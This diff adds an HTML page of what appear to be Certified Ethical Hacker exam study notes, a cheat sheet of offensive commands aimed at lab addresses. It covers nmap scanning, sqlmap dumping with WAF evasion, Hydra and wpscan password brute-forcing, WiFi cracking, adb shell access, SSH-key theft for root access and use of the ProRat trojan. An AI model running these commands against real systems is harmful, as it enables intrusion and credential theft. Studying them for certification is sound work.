@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CEH Notes</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            color: #333;
+            margin: 0;
+            padding: 20px;
+        }
+        h1 {
+            color: #333;
+        }
+        h2 {
+            color: #444;
+            border-bottom: 2px solid #ddd;
+            padding-bottom: 5px;
+        }
+        pre {
+            background-color: #eee;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+        .section {
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>CEH Notes</h1>
+
+    <div class="section">
+        <h2>Network Discovery</h2>
+        <pre>sudo netdiscover -r 192.168.1.0/24</pre>
+    </div>
+
+    <div class="section">
+        <h2>Resource Sharing</h2>
+        <h3>Wget:</h3>
+        <pre>
+Single file: wget http://192.168.0.101:8000/filename -O C:\path\to\destination\filename
+All files: Navigate to PasteFolder > wget -r -np -nd -A "*" http://192.168.0.101:8000/folder/
+        </pre>
+        <h3>SCP:</h3>
+        <pre>
+Start ssh service.
+Linux: service ssh start
+Windows: Settings > Apps > Optional Features > Add Feature > Install OpenSSH Server | Powershell: Start-Service sshd
+
+File: scp /path/to/local/file username@192.168.0.104:/path/to/destination
+Folder: scp -r /path/to/local/folder username@192.168.0.104:/path/to/destination/folder
+        </pre>
+        <h3>Python HTTP Server</h3>
+        <pre>
+cd OpenSharingFolder
+python3 -m http.server 8000
+Open VM, navigate to http://192.168.0.101:8000
+        </pre>
+    </div>
+
+    <div class="section">
+        <h2>NMAP</h2>
+        <h3>Best</h3>
+        <pre>
+nmap -sn 192.168.1.0/24
+nmap -A -T4 -p- 192.168.1.0/24
+nmap -sC -sV -Pn -T4 -vv -p- 192.168.1.0/24
+nmap --script vuln -Pn -T4 -p- 192.168.1.0/24
+        </pre>
+        <h3>Firewall/IDS, if opened</h3>
+        <pre>
+nmap -sS -v -p- 192.168.1.0/24
+nmap -f -p- 192.168.1.0/24
+        </pre>
+        <h3>UDP Scan</h3>
+        <pre>
+nmap -sU --top-ports 25 -p- 192.168.1.0/24
+        </pre>
+        <h3>SMB OS Discovery</h3>
+        <pre>nmap --script smb-os-discovery.nse IP</pre>
+    </div>
+
+    <div class="section">
+        <h2>SQLMap</h2>
+        <pre>
+sqlmap -r req.txt -dbs
+sqlmap -r req.txt -D DBName --tables
+sqlmap -r req.txt -D DBName --tables --columns
+sqlmap -r req.txt -D DBName --dump
+WAF: sqlmap -u "https://target.com" --dbs --level=5 --risk=3 --user-agent -v3 --tamper="between,randomcase,space2comment" --batch --dump
+        </pre>
+    </div>
+
+    <div class="section">
+        <h2>WordPress</h2>
+        <h3>WP Scan</h3>
+        <pre>
+wpscan --url http://192.168.0.1
+wpscan --url http://192.168.0.1 -e u #User Enum
+wpscan --url http://192.168.0.1 --enumerate u
+wpscan --url http://192.168.0.1 --usernames /home/user.txt --passwords(-P) /home/pass.txt
+wpscan --url http://192.168.0.1 -u john --passwords /home/pass.txt
+        </pre>
+        <h3>Metasploit</h3>
+        <pre>
+msfconsole :
+use auxiliary/scanner/http/wordpress_login_enum
+show options
+set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
+set RHOSTS 192.168.0.1 (target ip)
+set RPORT 8080 (target port)
+set TARGETURI http://192.168.0.1:8080/
+set USERNAME admin
+        </pre>
+    </div>
+
+    <div class="section">
+        <h2>Hydra</h2>
+        <pre>
+hydra -L /home/user.txt -P /home/pass.txt 192.168.0.1 ftp
+hydra -L /home/user.txt -P /home/pass.txt ftp://192.168.0.1
+hydra -L /home/user.txt -P /home/pass.txt 192.168.0.1 ssh
+hydra -L /home/user.txt -P /home/pass.txt ssh://192.168.0.1
+hydra -L usernames.txt -P passwords.txt -s 25 -vV 192.168.0.104 smtp
+        </pre>
+    </div>
+
+    <div class="section">
+        <h2>Steganography</h2>
+        <h3>SNOW (Windows)</h3>
+        <pre>
+Hide: SNOW -C -m "Hey Hacker" -p "hack" abc.txt abcd.txt
+Extract: SNOW -C -p "hack" abcd.txt
+        </pre>
+        <h3>OpenStego (Windows)</h3>
+        <pre>
+Click on Extract Data
+Select Stego file
+Select output folder
+Enter password & Click on Extract Data Button
+        </pre>
+        <h3>StegHide (Linux)</h3>
+        <pre>
+Hide: steghide embed -cf cover.png -ef secret.txt -p 1234
+Extract: steghide extract -sf steg.file
+Enter Password & Hit Enter
+        </pre>
+        <h3>Stegcracker (Linux)</h3>
+        <pre>stegcracker steg.file</pre>
+    </div>
+
+    <div class="section">
+        <h2>Cryptography</h2>
+        <h3>HashCalc (Windows)</h3>
+        <pre>
+Open File
+Click on Calculate Button
+        </pre>
+        <h3>VeraCrypt (Windows)</h3>
+        <pre>
+Select any Volume A,B,D,E
+Select Encrypted Folder
+Click on mount button
+Enter Password
+Open File Manager
+Open Newly created drive and open secret.txt file
+        </pre>
+        <h3>Crack Hash</h3>
+        <pre>
+Hash Analyzer
+Hashes
+CrackStation
+        </pre>
+        <h3>BCTextEncoder (Windows)</h3>
+        <pre>
+Paste Hash Value
+Click on Decode
+Enter Password
+        </pre>
+        <h3>Cryptool (Windows)</h3>
+        <h4>RC4:</h4>
+        <pre>
+Open File
+Encrypt/Decrypt > Symmetric(modern) > RC4
+Enter bit length (EX:14)
+Click on Decrypt
+        </pre>
+        <h4>DES(ECB):</h4>
+        <pre>
+Open File
+Encrypt/Decrypt > Symmetric(modern) > DES(ECB)
+Select bit length if given in question
+Click on Decrypt
+        </pre>
+    </div>
+
+    <div class="section">
+        <h2>Wireshark</h2>
+        <h3>For credentials</h3>
+        <pre>http.request.method == POST</pre>
+        <h3>For DoS Attack</h3>
+        <pre>
+Statistics > IPv4 Statistics > Source and Destination Address
+Apply Filter: tcp.flags.syn == 1 and tcp.flags.ack == 0
+        </pre>
+    </div>
+
+    <div class="section">
+        <h2>Android</h2>
+        <h3>Normal</h3>
+        <pre>
+nmap -p -sV -p 5555
+adb connect 192.168.0.1:5555
+adb shell
+cd sdcard
+cat secret.txt
+        </pre>
+        <h3>ELF</h3>
+        <pre>
+cd sdcard/scan
+sudo adb pull /sdcard/scan/
+ent evil.elf
+sha384sum evil.elf
+        </pre>
+    </div>
+
+    <div class="section">
+        <h2>End of Life (EOL)</h2>
+        <pre>
+nmap -Pn --script vuln 192.168.0.1
+Copy the CVE and Paste it on Google
+Check the severity | Ans (10)
+        </pre>
+    </div>
+
+    <div class="section">
+        <h2>Fully Qualified Domain Name (FQDN)</h2>
+        <pre>
+nmap -p 389 -sV -iL ip.list
+nmap -p 389 -sV 192.168.0.1
+FQDN: DC.pentester.team
+        </pre>
+    </div>
+
+    <div class="section">
+        <h2>WiFi</h2>
+        <pre>
+aircrack-ng cap.file
+aircrack-ng -w wordlist.txt cap.file
+aircrack-ng -b 2a:25:zd:54:48:as -w wordlist.txt cap.file
+        </pre>
+    </div>
+
+    <div class="section">
+        <h2>Privilege Escalation</h2>
+        <pre>
+Login in ssh
+sudo -l
+sudo -i
+        </pre>
+        <pre>
+id_rsa
+su user
+cd .ssh
+ls
+cat id_rsa & Copy it
+Paste on host Machine
+chmod 600 id_rsa
+ssh root@192.168.0.1 -i id_rsa -p 22
+        </pre>
+    </div>
+
+    <div class="section">
+        <h2>Malware</h2>
+        <pre>
+ProRat
+Enter Victim IP
+Click on connect
+Enter Password
+Click on Search Files "Searching for *.txt"
+Click on File Manager
+Move to Secret Directory & Download the secret file
+        </pre>
+    </div>
+
+    <div class="section">
+        <h2>Static Analysis ELF with DIE</h2>
+        <pre>
+Open Die
+Upload File
+Click on File Info
+        </pre>
+    </div>
+</body>
+</html>
